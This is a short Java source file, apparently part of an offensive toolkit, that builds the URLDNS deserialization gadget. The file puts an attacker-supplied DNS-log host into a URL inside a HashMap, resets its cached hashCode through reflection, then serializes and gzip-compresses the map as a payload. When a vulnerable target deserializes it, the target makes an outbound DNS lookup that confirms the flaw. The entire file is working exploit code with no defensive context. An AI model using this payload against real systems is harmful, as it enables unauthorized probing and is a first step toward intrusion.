package com.h2tg.frchannel.gadget;

import java.net.URL;
import java.util.HashMap;

import static com.h2tg.frchannel.Reflections.*;

public class URLDNS {

    public static byte[] getPayload(byte[] b) {
        try {
            String dnslog = new String(b);
            HashMap map = new HashMap();
            URL url = new URL("http://"+dnslog);
            setFieldValue(url,"hashCode",123123);
            map.put(url,123);
            setFieldValue(url,"hashCode",-1);

            byte[] ser = serialize(map);
            byte[] payload = GzipCompress(ser);

            return payload;
        }
        catch (Exception e){

        }
        return null;
    }

}
